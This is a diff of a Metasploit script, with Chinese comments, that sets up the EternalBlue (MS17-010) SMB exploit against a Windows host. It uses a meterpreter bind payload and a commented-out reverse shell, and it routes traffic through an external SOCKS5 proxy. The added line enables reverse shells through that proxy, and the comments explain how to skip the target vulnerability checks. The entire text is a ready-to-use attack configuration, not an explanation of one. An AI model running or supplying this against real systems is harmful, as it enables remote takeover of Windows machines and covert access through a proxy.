@@ -3,9 +3,7 @@
 # set payload windows/x64/shell/reverse_tcp
 # set lhost 192.168.183.131
 
-
 setg proxies socks5:39.99.139.21:1234
-
 
 use exploit/windows/smb/ms17_010_eternalblue
 set payload windows/x64/meterpreter/bind_tcp
@@ -13,6 +11,7 @@ set payload windows/x64/meterpreter/bind_tcp
 set rhosts 192.168.52.138
 show targets
 set lhost 0.0.0.0  # 设置为可达网段
+setg ReverseAllowProxy true    #允许反弹shell
 # set target 3
 # set VERIFY_ARCH false
 # set VERIFY_TARGET false  # 有时总提示 not vulnerable 用这个设置关闭检查
